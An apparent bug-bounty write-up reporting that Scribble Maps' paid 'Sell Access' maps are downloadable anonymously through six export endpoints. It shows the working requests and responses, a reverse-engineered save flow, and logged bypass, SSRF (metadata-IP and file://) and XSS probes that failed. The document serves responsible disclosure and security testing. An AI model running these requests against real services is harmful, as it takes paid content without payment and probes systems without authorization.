# Paid-content export gate — Scribble Maps "Sell Access" (2026-10-31)

Class: §2f of SKILL.md — one resource, many serialisation endpoints, entitlement checked on some and
not others. Net: **HIGH 7.5** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`. Reported to
`support@scribblemaps.com`; program pays $25–$2,000, portal at `api.scribblemaps.com/vulnerabilities`.

## Program shape (0A)

- Policy: `https://help.scribblemaps.com/help/a/vulnerabilities-and-bounties` (live, updated 2026-10-04).
- Paying classes: RCE $200–800 · file/DB access $500–2,000 · logic flaw leaking/bypassing controls
  $200–1,000 · **map security: improper map exposure, secure-map data leak $100–500** · client code
  exec $100–500 · misc $25–200.
- Named hosts: `www`, `team`, `manage`, `widgets`, `api`, `data` `.scribblemaps.com`.
- Out of scope (verbatim, read it before hunting): anonymous community maps, **unlisted
  (URL-as-credential) maps without LockView**, third-party stacks (GeoServer/Tomcat),
  **missing security headers without a concrete attack scenario**, **rate limiting in isolation**.
- Scanner etiquette: they ask you not to hammer, and to skip `/maps/` in scans. Honour it — automate
  gently (`-rl 8..10 -c 2`), it never blocks the finding.

Note the OOS clause interplay: an unlisted map is URL-as-credential *by design*, so a plain
`/api/maps/<code>/raw` hit on a random public map proves nothing. The finding only exists because
**paid (`listType:"paid"`, `free:false`) is a different access class** with its own priced gate.

## The bypass

```
GET https://www.scribblemaps.com/api/maps/paidsample/raw
-> 200 text/plain, 16908 bytes
   {"meta":{"title":"Monetize Your Expertise. Sell Your Map.","id":"paidsample",
            "listType":"paid","lastModified":"2025-08-09T23:17:49.31Z",...},
    "overlays":[ ... full overlay/layer tree ... ]}
```

All six data routes on the same map, anonymous: `/raw` 16908 · `/smjson` 16908 ·
`/smjsonbase64` 45028 · `/lzsbase64` 11512 · `/kml` 15497 · `/geojson` 6873.

Entitlement metadata, anonymous, same map:

```
GET https://api.scribblemaps.com/api/market/defaultPlans/paidsample
-> {"plans":[{"cost":19900,"months":0},{"cost":1999,"months":1},{"cost":9999,"months":12}],
    "mapCode":"paidsample","free":false,"allowCopy":false,"sample":null,"limit":15,...}
```

`cost` is cents: 19900 = USD 199 one-time, 1999 = 19.99/month, 9999 = 99.99/year.

## The four intent proofs (the part that makes it a bug, not by-design)

| Proof | Probe | Observed |
|---|---|---|
| renderer gates it | `GET /api/maps/images/800/600/paidsample.png(/metadata)` | `401` both |
| sibling host gates it | same path on `api.scribblemaps.com` | `401 application/problem+json` |
| sibling class gates it | password-protected map, same 6 routes | `401` all six |
| client treats paid as protected | SDK bundle save branch | `"paid"==d&&(a.listed=!1,a.secure=!0)` |

The password control map was created on the researcher's own free account — see below — so the 401
is on a real map, not a hypothetical.

## Creating your own gated resource when the save API is undocumented

The editor is an Angular shell over a 6.4 MB SDK (`cdn.scribblemaps.com/api/js/<ver>/scripts/main.js`).
The SDK carries the complete route table as literals — grep `"maps/{mapCode}` and you get
`raw, smjson, smjsonbase64, lzsbase64, history, settings, listing, users, users/authority, tags,
stream/, stream/new, isPro, lastModified, sendToFriend, format`. That list *is* the audit surface.

Saving is a **two-step** flow (this is the part that silently fails if you guess):

```
GET  /api/maps/newCode                     -> "PmZmbNzHxw"          (raw JSON string, quotes included)
POST /api/maps/<code>/stream/new           -> {"streamCode":"<uuid>","locked":false}
{"password":"<pw or empty>","title":"…","description":"…","secure":true|false,
 "version":"2.1","lat":…,"lng":…,"charLength":905,"mapTypeId":0,
 "baseMap":"sm_road_v2","format":"smjsonUTF8","sd":true,"agentMode":false}

POST /api/maps/<code>/stream/              -> {"lastModified":…,"hash":…,"seo":null}
{"streamCode":"<the uuid from stream/new>","data":"<smjson string>"}
```

`stream/` returns **500** if you send a `streamCode` you made up: it must be the one `stream/new`
just issued. That 500 looks like a permissions failure and is not — it cost a round here.

Capture the real payload instead of guessing: open `/create/` in Playwright, call
`window.sm.map.saveCurrent()`, and record `page.on("request")` for `/api/maps/`. The first save writes
`secure:false,password:""`; re-run `stream/new` with `secure:true,"password":"<x>"` and the map becomes
a password-protected one your account owns, `hasPassword:true`.

## False-positive guards that were run

- **Unlisted maps are OOS by design** — do not report `/raw` on a random public map. The gate only
  matters for `listType:"paid"` (and `secure`).
- **`/data`, `/json`, `/sml` return `409 Conflict`** on every map (`The page was not displayed because
  there was a conflict`). That is ASP.NET's verb/route refusal, not a gate; a 409 is not a negative and
  not a finding.
- **`/api/maps/<code>/users` returns `200 []` to anyone**, owner or not, on a non-existent map too. It
  is a membership list that only populates for shared maps — do not read the 200 as BOLA.
- **`/api/maps/-1`, `/api/maps/0`, `/api/maps/1` resolve** because the API accepts a numeric internal id
  as well as a map code. `/api/maps/-1` also reports `hasPassword:true` yet serves `/kml` anonymously —
  that looks like the same bug on a second map, but `-1` is a map whose code is literally `-1`
  (**"World Map 1"**), i.e. its password flag is stale, not enforced. Prove the *class* on your own
  map, and cite the vendor's paid sample; do not build the report on ambiguous legacy rows.
- Verify 3x with 3 User-Agents and no cookies; identical SHA-256
  (`REDACTED_********`) rules out caching/state.

## Coverage negatives on the same target (record, don't re-run)

- Secure-map gate bypass: 16 variants (case, `./`, `//`, `%72aw`, trailing `;`/`.`, `..`, `?password=`,
  `X-Map-Password`, cookie) → all `401`; correct `?password=<urlencoded>` → `200`, wrong → `401`.
  **URL-encode the password** — a `#` in it truncates the query and fakes a failure.
- BOLA `POST /api/maps/<code>/users` as a non-owner → `401`; `GET .../users/authority` → `false`.
- Team app: `/api/users?teamCode=<other>` from a non-member → returns the login HTML page (not JSON);
  data only for your own team. Cross-tenant negative.
- `POST /api/subscribe/checkout` then `validateSession` on the unpaid Stripe session → no entitlement
  (`userTypeId` unchanged, `products: []`).
- `oembed.json|xml?url=` → no fetch (interactsh 0 callbacks; `169.254.169.254`/`127.0.0.1`/`file://`
  all echo a fixed payload). Not SSRF.
- Map title/description HTML payload → escaped in `<title>` and in oEmbed attributes. No stored XSS.
- Team features (S3 `/presign`, connectors, SAML/SCIM, audit log) → `402 Team subscription has expired`
  on a free-plan team: unreachable, N/A not negative.
